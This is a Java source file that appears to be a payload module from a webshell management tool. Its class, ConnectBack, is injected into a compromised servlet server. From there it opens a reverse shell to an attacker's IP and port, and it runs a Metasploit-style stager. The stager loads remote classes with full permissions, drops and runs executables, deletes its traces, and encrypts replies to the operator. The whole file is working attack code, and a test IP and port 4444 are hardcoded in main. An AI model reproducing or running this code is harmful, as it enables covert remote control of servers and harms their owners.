package vip.youwe.sheller.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.*;

public class ConnectBack extends ClassLoader implements Runnable {

    public static String type;
    public static String ip;
    public static String port;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    InputStream dn;
    OutputStream rm;

    public ConnectBack(InputStream dn, OutputStream rm) {
        this.dn = dn;
        this.rm = rm;
    }


    public ConnectBack() {
    }


    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        Map<String, String> result = new HashMap<String, String>();
        try {
            if (type.equals("shell")) {
                shellConnect();
            } else if (type.equals("meter")) {
                meterConnect();
            }
            result.put("status", "success");
        } catch (Exception e) {
            result.put("status", "fail");
            result.put("msg", e.getMessage());
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }

    public void run() {
        BufferedReader hz = null;
        BufferedWriter cns = null;
        try {
            hz = new BufferedReader(new InputStreamReader(this.dn));
            cns = new BufferedWriter(new OutputStreamWriter(this.rm));
            char[] buffer = new char[8192];
            int length;
            while ((length = hz.read(buffer, 0, buffer.length)) > 0) {
                cns.write(buffer, 0, length);
                cns.flush();
            }
        } catch (Exception exception) {
        }

        try {
            if (hz != null)
                hz.close();
            if (cns != null)
                cns.close();
        } catch (Exception exception) {
        }
    }


    private void shellConnect() throws IOException {
        try {
            String ShellPath;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                ShellPath = new String("/bin/sh");
            } else {
                ShellPath = new String("cmd.exe");
            }

            Socket socket = new Socket(ip, Integer.parseInt(port));
            Process process = Runtime.getRuntime().exec(ShellPath);

            (new Thread(new ConnectBack(process.getInputStream(), socket.getOutputStream()))).start();

            (new Thread(new ConnectBack(socket.getInputStream(), process.getOutputStream()))).start();
        } catch (Exception e) {
            throw e;
        }
    }


    public static void main(String[] args) {
        try {
            ConnectBack c = new ConnectBack();
            ip = "192.168.50.53";
            port = "4444";
            c.meterConnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void meterConnect() throws Exception {
        Properties props = new Properties();
        Class clazz = ConnectBack.class;
        String clazzFile = clazz.getName().replace('.', '/') + ".class";
        props.put("LHOST", ip);
        props.put("LPORT", port);

        String executableName = props.getProperty("Executable");
        if (executableName != null) {
            File dummyTempFile = File.createTempFile("~spawn", ".tmp");
            dummyTempFile.delete();
            File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
            tempDir.mkdir();
            File executableFile = new File(tempDir, executableName);
            writeEmbeddedFile(clazz, executableName, executableFile);
            props.remove("Executable");
            props.put("DroppedExecutable", executableFile.getCanonicalPath());
        }

        int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
        String droppedExecutable = props.getProperty("DroppedExecutable");
        if (spawn > 0) {
            props.setProperty("Spawn", String.valueOf(spawn - 1));

            File dummyTempFile = File.createTempFile("~spawn", ".tmp");
            dummyTempFile.delete();
            File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
            File propFile = new File(tempDir, "metasploit.dat");
            File classFile = new File(tempDir, clazzFile);
            classFile.getParentFile().mkdirs();

            writeEmbeddedFile(clazz, clazzFile, classFile);
            if (props.getProperty("URL", "").startsWith("https:")) {
                writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
            }
            if (props.getProperty("AESPassword", null) != null) {
                writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
            }
            FileOutputStream fos = new FileOutputStream(propFile);
            props.store(fos, "");
            fos.close();
            Process proc = Runtime.getRuntime().exec(new String[]{
                    getJreExecutable("java"), "-classpath", tempDir

                    .getAbsolutePath(), clazz
                    .getName()
            });

            proc.getInputStream().close();
            proc.getErrorStream().close();

            Thread.sleep(2000L);

            File[] files = {classFile, classFile.getParentFile(), propFile, tempDir};

            for (int i = 0; i < files.length; i++) {
                for (int j = 0; j < 10 &&
                        !files[i].delete(); j++) {

                    files[i].deleteOnExit();
                    Thread.sleep(100L);
                }
            }
        } else if (droppedExecutable != null) {
            File droppedFile = new File(droppedExecutable);

            if (!IS_DOS) {
                try {
                    try {
                        File.class.getMethod("setExecutable", Boolean.TYPE).invoke(droppedFile, Boolean.TRUE);
                    } catch (NoSuchMethodException ex) {
                        Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
                    }
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }

            Runtime.getRuntime().exec(new String[]{droppedExecutable});
            if (!IS_DOS) {
                droppedFile.delete();
                droppedFile.getParentFile().delete();
            }
        } else {
            OutputStream out;
            InputStream in;
            int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
            String lHost = props.getProperty("LHOST", null);
            String url = props.getProperty("URL", null);

            if (lPort <= 0) {
                in = System.in;
                out = System.out;
            } else if (url != null) {
                if (url.startsWith("raw:")) {
                    in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
                } else if (url.startsWith("https:")) {
                    URLConnection uc = (new URL(url)).openConnection();
                    Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", URLConnection.class).invoke(null, uc);
                    in = uc.getInputStream();
                } else {
                    in = (new URL(url)).openStream();
                }
                out = new ByteArrayOutputStream();
            } else {
                Socket socket;
                if (lHost != null) {
                    socket = new Socket(lHost, lPort);
                } else {
                    ServerSocket serverSocket = new ServerSocket(lPort);
                    socket = serverSocket.accept();
                    serverSocket.close();
                }
                in = socket.getInputStream();
                out = socket.getOutputStream();
            }

            String aesPassword = props.getProperty("AESPassword", null);
            if (aesPassword != null) {

                Object[] streams = (Object[]) Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class)
                        .invoke(null, in, out, aesPassword);
                in = (InputStream) streams[0];
                out = (OutputStream) streams[1];
            }

            StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
            String[] stageParams = new String[stageParamTokenizer.countTokens()];
            for (int i = 0; i < stageParams.length; i++) {
                stageParams[i] = stageParamTokenizer.nextToken();
            }
            (new ConnectBack()).bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
        }
    }

    private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws FileNotFoundException, IOException {
        InputStream in = clazz.getResourceAsStream("/" + resourceName);
        FileOutputStream fos = new FileOutputStream(targetFile);
        byte[] buf = new byte[4096];
        int len;
        while ((len = in.read(buf)) != -1) {
            fos.write(buf, 0, len);
        }
        fos.close();
    }

    private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
        try {
            Class clazz;
            DataInputStream in = new DataInputStream(rawIn);

            Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            if (embeddedStageName == null) {
                int length = in.readInt();
                do {
                    byte[] classfile = new byte[length];
                    in.readFully(classfile);
                    resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
                    length = in.readInt();
                } while (length > 0);
            } else {

                clazz = Class.forName("javapayload.stage." + embeddedStageName);
            }
            Object stage = clazz.newInstance();
            clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(stage, in, out, stageParameters);
        } catch (Throwable t) {
            t.printStackTrace();
            t.printStackTrace(new PrintStream(out));
        }
    }


    private static final String OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
    private static final String PATH_SEP = System.getProperty("path.separator");

    private static final boolean IS_AIX = "aix".equals(OS_NAME);
    private static final boolean IS_DOS = PATH_SEP.equals(";");
    private static final String JAVA_HOME = System.getProperty("java.home");

    private static String getJreExecutable(String command) {
        File jExecutable = null;

        if (IS_AIX) {
            jExecutable = findInDir(JAVA_HOME + "/sh", command);
        }

        if (jExecutable == null) {
            jExecutable = findInDir(JAVA_HOME + "/bin", command);
        }

        if (jExecutable != null) {
            return jExecutable.getAbsolutePath();
        }

        return addExtension(command);
    }


    private static String addExtension(String command) {
        return command + (IS_DOS ? ".exe" : "");
    }


    private static File findInDir(String dirName, String commandName) {
        File dir = normalize(dirName);
        File executable = null;
        if (dir.exists()) {
            executable = new File(dir, addExtension(commandName));
            if (!executable.exists()) {
                executable = null;
            }
        }
        return executable;
    }

    private static File normalize(String path) {
        Stack s = new Stack();
        String[] dissect = dissect(path);
        s.push(dissect[0]);

        StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);
        while (tok.hasMoreTokens()) {
            String thisToken = tok.nextToken();
            if (".".equals(thisToken)) {
                continue;
            }
            if ("..".equals(thisToken)) {
                if (s.size() < 2) {
                    return new File(path);
                }
                s.pop();
                continue;
            }
            s.push(thisToken);
        }

        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < s.size(); i++) {
            if (i > 1) {

                sb.append(File.separatorChar);
            }
            sb.append(s.elementAt(i));
        }
        return new File(sb.toString());
    }

    private static String[] dissect(String path) {
        char sep = File.separatorChar;
        path = path.replace('/', sep).replace('\\', sep);

        String root = null;
        int colon = path.indexOf(':');
        if (colon > 0 && IS_DOS) {

            int next = colon + 1;
            root = path.substring(0, next);
            char[] ca = path.toCharArray();
            root = root + sep;

            next = (ca[next] == sep) ? (next + 1) : next;

            StringBuffer sbPath = new StringBuffer();

            for (int i = next; i < ca.length; i++) {
                if (ca[i] != sep || ca[i - 1] != sep) {
                    sbPath.append(ca[i]);
                }
            }
            path = sbPath.toString();
        } else if (path.length() > 1 && path.charAt(1) == sep) {

            int nextsep = path.indexOf(sep, 2);
            nextsep = path.indexOf(sep, nextsep + 1);
            root = (nextsep > 2) ? path.substring(0, nextsep + 1) : path;
            path = path.substring(root.length());
        } else {
            root = File.separator;
            path = path.substring(1);
        }
        return new String[]{root, path};
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    this.getClass();
                    Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));

                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }
}
